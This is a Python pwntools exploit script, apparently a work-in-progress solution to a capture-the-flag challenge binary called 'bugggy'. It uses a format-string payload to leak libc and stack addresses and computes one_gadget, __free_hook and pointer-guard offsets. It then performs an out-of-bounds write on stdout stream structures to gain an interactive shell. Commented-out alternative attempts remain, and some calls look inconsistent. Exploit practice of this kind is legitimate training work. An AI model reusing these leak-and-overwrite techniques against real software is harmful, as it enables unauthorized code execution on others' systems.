#!/usr/bin/env python3
from pwn import *

p = process('./bugggy')

# def rol(num, bits):
#     return ((num << bits) | (((num << bits) & 0xffffffffffffffff0000000000000000) >> 64)) & 0xffffffffffffffff

# name = b'%11$p%7$p\n'
# p.sendafter(b'name ?', name)
# 
# p.recvuntil(b'hi, ')
# libc  = int(p.recv(14), 16) - 0x1ed4a0
# ld    = int(p.recv(14), 16)
# mmap  = libc + 0x22c000
# one_gadget = libc + 0xe6aee
# xor_key = libc + 0x1f3570
# 
# log.info('libc  : ' + hex(libc))
# log.info('ld    : ' + hex(ld))
# log.info('mmap  : ' + hex(mmap))
# log.info('one_gadget : ' + hex(one_gadget))

name = b'%11$p%19$p'
p.sendafter(b'name ?', name)

p.recvuntil(b'hi, ')
libc  = int(p.recv(14), 16) - 0x1ed4a0
stack = int(p.recv(14), 16)
mmap  = libc + 0x22c000
ld    = libc + 0x200000
one_gadget = libc + 0xe6aee
free_hook = libc + 0x1eeb28
xor_key = libc + 0x1f3570
ret_addr = stack - 0x28

log.info('libc  : ' + hex(libc))
log.info('ld    : ' + hex(ld))
log.info('stack : ' + hex(stack))
log.info('mmap  : ' + hex(mmap))
log.info('one_gadget : ' + hex(one_gadget))
log.info('free_hook  : ' + hex(free_hook))

# name = b'%p%19$p\n'
# p.sendafter(b'name ?', name)
# 
# p.recvuntil(b'hi, ')
# text  = int(p.recv(14), 16) - 0x200f
# stack = int(p.recv(14), 16)
# ret_addr = stack - 0x28
# 
# log.info('text  : ' + hex(text))
# log.info('stack : ' + hex(stack))

raw_input('>')

p.sendafter(b'wrong ?', b'Yes\n')

data = free_hook & 0xffffffff

# _io_file_jumps table
# idx = 6 # max: 21; cond: 3,4,5,7,14,15
# addr_offset = ((0x1ed4a0 + idx * 8) - (0x22c000) - 8) // 4 - 4

# overwrite return address
# addr_offset = ((ret_addr) - (mmap) - 8) // 4 - 4

# Overwrite stdout stream buf
addr_offset = ((0x1eb988 + 0x38) - (0x22c000) - 8) // 4 - 4

p.sendafter(b'2. scanf', str(data) + ' ' + str(addr_offset) + '\n')
print('go')

p.interactive()

# target_addr = xor_key
# addr_offset = (target_addr - mmap) // 8 - 4
addr_offset = 1

p.sendafter(b'2. bof', str(addr_offset) + '\n')
print('go')

p.interactive()

